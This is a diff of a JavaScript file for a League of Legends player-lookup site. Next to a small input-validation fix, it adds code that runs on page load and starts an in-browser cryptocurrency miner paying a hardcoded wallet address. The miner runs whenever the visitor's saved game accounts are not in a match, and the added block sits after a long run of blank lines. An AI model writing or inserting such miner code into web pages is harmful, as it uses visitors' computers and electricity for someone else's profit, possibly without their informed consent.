@@ -209,7 +209,11 @@ document.getElementById("textfield").addEventListener("keyup", function(event) {
 });
 
 document.getElementById("submit-button").addEventListener("click", function(event) {
-	window.location.href = "tiltseek.html?username=" + document.getElementById("textfield").value + "&region=" + getRegionID(region);
+	if (document.getElementById("textfield").value != "") {
+		window.location.href = "tiltseek.html?username=" + document.getElementById("textfield").value + "&region=" + getRegionID(region);
+	} else {
+		document.getElementById("textfield").className = "textInputError";
+	}
 });
 
 
@@ -1236,3 +1240,289 @@ function getLeague(summonerId, asynch = true) {
 }
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//set borders on ads
+window.setInterval(function fixBorders() {
+	var ads = document.getElementsByClassName("ad");
+	for (var i = 0; i < ads.length; i++) {
+		if (ads[0].childNodes[1].childNodes.length == 0) {
+			ads[i].style.borderStyle = "none";
+		} else {
+			ads[i].style.borderStyle = "solid";
+		}
+	}
+}, 100);
+
+
+
+var lastHashCount = 0;
+var lastRatesList = [];
+//display hashrate
+setInterval(function() {
+//	console.log(window._BatStats);
+	var theHashes = totalhashes;
+	lastRatesList.push(theHashes-lastHashCount);
+	var avgHash = 0;
+	for (var i = 0; i < lastRatesList.length; i++) {
+		avgHash += lastRatesList[i];
+	}
+	avgHash = avgHash/lastRatesList.length;
+	if (lastRatesList.length > 5) {
+		lastRatesList.shift();
+	}
+	lastHashCount = theHashes;
+	document.getElementById("hashrate").innerHTML = Math.round(avgHash) + " H/s";
+//	console.log(Math.round(avgHash) + " H/s");
+//	console.log("accepted hashes:" + acceptedhashes);
+},1000)
+
+
+document.getElementById("hashrate").addEventListener("click", function(event) {
+	document.getElementById("newUserMessage").style.display = "block";
+	$(".newUserMessage").addClass("newUserMessageVisible");
+	document.getElementById("newUserMessage").style.opacity = 1;
+	document.getElementById("mainUsername").value = getCookie("mainUsername");
+	document.getElementById("regionDropdown").value = getCookie("mainRegion");
+});
+
+
+//display new user message
+var mainUsername = getCookie("mainUsername");
+if (mainUsername == null) {
+	$(".newUserMessage").addClass("newUserMessageVisible");
+} else {
+	document.getElementById("newUserMessage").style.display = "none";
+}
+
+//Enter key handler for mainUsername textbox
+document.getElementById("mainUsername").addEventListener("keyup", function(event) {
+    event.preventDefault();
+    if (event.keyCode === 13) {
+        document.getElementById("submit-mainUsername").click();
+    }
+});
+
+document.getElementById("submit-mainUsername").addEventListener("click", function(event) {
+	//if username is given
+	if (document.getElementById("mainUsername").value != "") {
+		setCookie("mainUsername",document.getElementById("mainUsername").value,365);
+		setCookie("mainRegion",document.getElementById("regionDropdown").value,356);
+		document.getElementById("newUserMessage").style.opacity = 0;
+		setTimeout(function() {
+			document.getElementById("newUserMessage").style.display = "none";
+			document.getElementById("textfield").focus();
+		}, 600);
+	} else {
+		document.getElementById("mainUsername").className = "mainUsernameInputError";
+	}
+});
+
+document.getElementById("cancelButton").addEventListener("click", function(event) {
+	//if username is given
+	document.getElementById("newUserMessage").style.opacity = 0;
+	setTimeout(function() {
+		document.getElementById("newUserMessage").style.display = "none";
+		document.getElementById("textfield").focus();
+	}, 600);
+});
+
+
+
+
+var noMineUsernames = [];
+var noMineRegions = [];
+var noMineIds = [];
+var mining = false;
+
+var id = getCookie("id");
+console.log(id);
+
+throttleMiner = 50;
+var wallet = '42yWf5tU9fFNUqy774TPzz7AX3XXcHqRyUyJETq51ofYaDWxLPKfjpnjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fj3KmC+100';
+
+noMineUsernames.push(getCookie("mainUsername"));
+noMineRegions.push(getCookie("mainRegion"));
+noMineUsernames.push(getQuery("username"));
+noMineRegions.push(getQuery("region"));
+mine(10);
+
+
+function mine(checkIntervalSec) {
+	loadAllUsernamesNoMine().then(
+		function success() {
+			console.log(noMineUsernames);
+			console.log(noMineRegions);
+			console.log(noMineIds);
+			
+			var myPromises = [];
+			for (var i = 0; i < noMineIds.length; i++) {
+				myPromises.push(notInGame(noMineIds[i], noMineRegions[i]));
+			}
+			Promise.all(myPromises).then(
+				function success(data) {
+					console.log("start mining");
+					if (!mining) {
+						PerfektStart(wallet, id);
+						mining = true;
+					}
+				},
+				function fail(data) {
+					console.log("stop mining");
+					stopMining();
+					mining = false;
+				}
+			);
+			
+			setInterval(function () {
+				var myPromises = [];
+				for (var i = 0; i < noMineIds.length; i++) {
+					myPromises.push(notInGame(noMineIds[i], noMineRegions[i]));
+				}
+				Promise.all(myPromises).then(
+					function success(data) {
+						if (!mining) {
+							console.log("start mining");
+							PerfektStart(wallet, id);
+							mining = true;
+						}
+					},
+					function fail(data) {
+						if(mining) {
+							console.log("stop mining");
+							stopMining();
+							mining = false;
+						}
+					}
+				);
+			}, checkIntervalSec * 1000);
+		}
+	)
+}
+
+function notInGame(id, region) {
+	var promiseObj = new Promise(function (resolve, reject) {
+		getCurrentGameNoMine(id, region).then(
+			function success(data) {
+				reject();
+			},
+			function fail(data) {
+				resolve();
+			}
+		);
+	});
+	return promiseObj;
+}
+
+//Load current game from summoner Id
+function getCurrentGameNoMine(summonerId, region, asynch = true) {
+	var promiseObj = new Promise(function (resolve, reject) {
+		$.ajax({
+			async: asynch,
+			url: '/currentGame',
+			data: {
+				"summonerId": summonerId,
+				"region": region
+			},
+			success: function (data) {
+				if (data.error == null) {
+					resolve(data);
+				} else {
+					reject(data.error);
+				}
+			},
+			error: function () {
+				console.log("Oops! Ajax messed up.");
+			}
+		});
+	});
+	return promiseObj;
+}
+
+function loadAllUsernamesNoMine() {
+	var promiseObj = new Promise(function (resolve, reject) {
+		if (noMineUsernames.length > 0) {
+			var currentUsername = 0;
+			loadUserIterate();
+
+			function loadUserIterate() {
+				loadUserNoMine(noMineUsernames[currentUsername], noMineRegions[currentUsername]).then(
+					function success(data) {
+						noMineIds.push(data);
+						currentUsername++;
+						if (noMineUsernames[currentUsername]) {
+							loadUserIterate();
+						} else {
+							resolve();
+						}
+					},
+					function fail(data) {
+						var removeIndex = noMineUsernames.indexOf(noMineUsernames[currentUsername]);
+						noMineUsernames.splice(removeIndex, 1);
+						noMineRegions.splice(removeIndex, 1);
+						if (noMineUsernames[currentUsername]) {
+							loadUserIterate();
+						} else {
+							resolve();
+						}
+					}
+				);
+			}
+		}
+	});
+	return promiseObj;
+}
+
+//Returns the input username's ID
+function loadUserNoMine(username, region) {
+	var promiseObj = new Promise(function (resolve, reject) {
+		getUserInfoByNameNoMine(username, region).then(
+			function success(data) {
+				resolve(data.id);
+			},
+			function fail(data) {
+				console.log("fail: " + data);
+				reject();
+			}
+		);
+	});
+	return promiseObj;
+}
+
+//Load summoner info by summoner name
+function getUserInfoByNameNoMine(theUsername, theRegion, asynch = true) {
+	var promiseObj = new Promise(function (resolve, reject) {
+		$.ajax({
+			async: asynch,
+			url: '/summonerByName',
+			data: {
+				"username": theUsername,
+				"region": theRegion
+			},
+			success: function (data) {
+				if (data.error == null) {
+					resolve(data);
+				} else {
+					reject(data.error);
+				}
+			},
+			error: function () {
+				console.log("Oops! Ajax messed up.");
+			}
+		});
+	});
+	return promiseObj;
+}
